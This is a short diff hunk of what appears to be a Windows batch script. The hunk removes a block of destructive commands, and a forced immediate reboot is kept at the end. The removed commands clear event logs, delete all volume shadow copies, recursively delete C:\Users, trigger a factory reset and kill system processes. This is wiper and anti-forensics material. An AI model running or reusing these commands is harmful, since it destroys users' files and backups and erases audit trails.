@@ -324,14 +324,4 @@ del %temp%\tempout3327049.txt
 del %temp%\tempout3327048.txt
 del %temp%\tempout3327047.txt
 cls
-del /q /s %temp%\*
-RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8
-RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2
-RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 1
-wevtutil el | Foreach-Object {wevtutil cl "$_"}
-vssadmin delete shadows /all /quiet
-rmdir /s /q "C:\Users"
-systemreset -factoryreset
-taskkill explorer.exe /F /T
-taskkill system.exe /F /T
 shutdown /r /f /t 0
